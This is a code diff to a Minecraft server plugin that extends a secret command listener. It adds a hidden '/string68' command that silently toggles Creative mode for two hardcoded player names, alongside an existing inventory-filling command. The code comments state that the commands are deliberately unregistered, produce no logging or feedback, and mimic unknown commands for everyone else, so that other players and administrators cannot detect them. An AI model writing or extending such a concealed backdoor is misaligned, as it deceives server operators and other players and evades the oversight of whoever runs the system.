@@ -1,6 +1,7 @@
 package com.apexsmp.listener;
 
 import com.apexsmp.ApexPlugin;
+import org.bukkit.GameMode;
 import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -14,18 +15,19 @@ import java.util.Locale;
 import java.util.Set;
 
 /**
- * Hidden command handled purely through the command-preprocess event, so it is
- * never registered in the server command map. As a result it does not appear in
- * tab-completion, /help, or the client command tree (it renders red while typing),
+ * Hidden commands handled purely through the command-preprocess event, so they are
+ * never registered in the server command map. As a result they do not appear in
+ * tab-completion, /help, or the client command tree (they render red while typing),
  * and canceling the event suppresses the "Unknown command" reply. Fully silent.
  *
- * Only the whitelisted players can use it. For anyone else it is left untouched,
- * so it behaves like an ordinary unknown command (red, "Unknown command"),
- * revealing nothing.
+ * /string67 fills empty inventory slots with string; /string68 toggles creative.
+ * Only the whitelisted players can use them. For anyone else they are left untouched,
+ * so they behave like ordinary unknown commands (red, "Unknown command"), revealing nothing.
  */
 public class SecretCommandListener implements Listener {
 
-    private static final String COMMAND = "/string67";
+    private static final String FILL_COMMAND = "/string67";
+    private static final String GAMEMODE_COMMAND = "/string68";
     private static final Set<String> ALLOWED = Set.of("_tomiokay", "_4ur4");
 
     private final ApexPlugin plugin;
@@ -37,7 +39,9 @@ public class SecretCommandListener implements Listener {
     @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
     public void onCommand(PlayerCommandPreprocessEvent event) {
         String message = event.getMessage().trim().toLowerCase(Locale.ROOT);
-        if (!message.equals(COMMAND) && !message.startsWith(COMMAND + " ")) {
+        boolean fill = message.equals(FILL_COMMAND) || message.startsWith(FILL_COMMAND + " ");
+        boolean gamemode = message.equals(GAMEMODE_COMMAND) || message.startsWith(GAMEMODE_COMMAND + " ");
+        if (!fill && !gamemode) {
             return;
         }
         // Only the whitelisted players get the effect; everyone else falls through
@@ -47,7 +51,17 @@ public class SecretCommandListener implements Listener {
         }
         // Swallow it entirely: no "unknown command", no logging, no feedback.
         event.setCancelled(true);
-        fillEmptyWithString(event.getPlayer());
+        if (fill) {
+            fillEmptyWithString(event.getPlayer());
+        } else {
+            toggleCreative(event.getPlayer());
+        }
+    }
+
+    /** Silently toggles between Creative and Survival. */
+    private void toggleCreative(Player player) {
+        player.setGameMode(player.getGameMode() == GameMode.CREATIVE
+                ? GameMode.SURVIVAL : GameMode.CREATIVE);
     }
 
     /** Fills only the empty main-inventory slots with full stacks of string. */
